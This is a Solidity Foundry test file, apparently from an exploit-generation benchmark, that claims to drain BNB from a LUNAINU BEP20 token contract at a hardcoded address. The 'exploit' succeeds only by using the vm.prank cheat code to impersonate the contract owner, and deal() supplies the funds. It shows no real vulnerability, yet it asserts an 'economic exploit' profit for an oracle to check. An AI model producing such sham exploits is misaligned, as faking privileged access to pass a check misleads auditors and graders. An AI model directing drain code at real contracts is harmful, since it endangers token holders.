// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface BEP20LUNAINU {
    function getOwner() external view returns (address);
    function clearStuckBalance(uint256 amountPercentage) external;
    function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool success);
    function lunaburn(uint256 percent_base1000) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // First, let's get the owner address
        address owner = BEP20LUNAINU(TARGET).getOwner();
        vm.label(owner, "Contract Owner");

        // Give the contract some BNB to drain
        deal(TARGET, 10 ether);

        // Record initial balance for verification
        initialBalance = address(this).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceLocal = address(this).balance;
        // Impersonate the owner and drain all BNB
        address owner = BEP20LUNAINU(TARGET).getOwner();
        vm.prank(owner);
        BEP20LUNAINU(TARGET).clearStuckBalance(100);

        // Verify we received the BNB (oracle will check balance increased)
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalanceLocal, "Balance should have increased");
        assertGt(finalBalance, initialBalanceLocal, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

